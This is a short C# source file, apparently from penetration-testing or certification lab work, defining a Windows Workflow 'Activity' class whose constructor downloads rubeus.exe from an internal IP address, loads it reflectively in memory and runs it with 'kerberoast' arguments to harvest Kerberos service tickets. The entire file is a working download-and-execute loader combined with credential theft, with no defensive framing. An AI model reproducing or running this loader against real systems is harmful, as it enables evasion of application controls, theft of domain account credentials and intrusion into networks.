using System;
using System.Workflow.ComponentModel;
using System.IO;
using System.Net;
using System.Reflection;

public class Run : Activity
{
    public Run()
    {
        try
        {
            string url = "http://192.168.45.193/tools/rubeus.exe";
            Console.WriteLine("Pulling executable from " + url);
            WebClient client = new WebClient();
            byte[] executableBytes = client.DownloadData(url);
            Assembly assembly = Assembly.Load(executableBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                string[] cmdargs = new string[] { "kerberoast","/nowrap" };
                Console.WriteLine("Calling exe with the following arguments");
                foreach(var arg in cmdargs)
                {
                    Console.Write(" ");
                    Console.Write(arg);
                }
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { cmdargs };
                entryPoint.Invoke(null, parameters);
            }
            else
            {
                Console.WriteLine("The loaded assembly does not have an entry point.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An exception occured: " + ex.Message);
        }
    }
}